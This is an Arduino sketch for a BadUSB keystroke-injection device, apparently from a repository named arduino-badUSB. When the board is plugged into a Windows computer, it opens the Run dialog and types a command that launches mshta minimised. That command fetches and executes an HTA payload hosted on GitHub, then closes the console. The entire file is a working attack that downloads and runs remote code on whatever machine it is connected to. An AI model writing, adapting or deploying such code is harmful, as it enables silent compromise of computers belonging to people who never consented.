#include "Keyboard.h"

#define BEGIN_DELAY 1000
#define PRESS_KEY_DELAY 50

#define ENTER press_key(KEY_RETURN)
#define DELETE press_key(KEY_DELETE)
#define COMBINATION(k1, k2) Keyboard.press(k1); Keyboard.press(k2); Keyboard.releaseAll()


void sequence()
{
  COMBINATION(KEY_LEFT_GUI, 'r');
  delay(200);
  Keyboard.print("cmd /c start /min mshta https://raw.githubusercontent.com/n643064/arduino-badUSB/refs/heads/master/payload.hta ^& exit");
  delay(200);
  ENTER;
}

void press_key(uint8_t key)
{
  Keyboard.press(key);
  delay(PRESS_KEY_DELAY);
  Keyboard.release(key);
}

void setup()
{
  pinMode(5, INPUT_PULLUP);
  if (digitalRead(5) == 0) // Don't run anything for easier uploading
    return;
   Keyboard.begin();
   delay(BEGIN_DELAY);
   sequence();
   Keyboard.end();
}

void loop()
{
  
}
